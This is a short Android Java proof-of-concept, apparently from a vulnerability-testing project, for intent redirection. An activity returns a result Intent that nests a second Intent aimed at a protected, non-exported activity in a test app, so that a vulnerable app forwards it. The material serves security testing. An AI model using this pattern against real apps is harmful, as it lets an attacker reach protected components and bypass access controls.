package sherlock.poc.intent_redirection;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

public class InterceptImplicitIntentActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent target = new Intent();
        target.setClassName("sherlock.test", "sherlock.test.protected_components.ProtectedActivity");

        Bundle bundle = new Bundle();
        bundle.putParcelable("extra_intent", target);

        Intent i = new Intent();
        i.putExtra("extra_intent", target);
        i.putExtra("bundle", bundle);
        setResult(RESULT_OK, i);
        finish();
    }
}
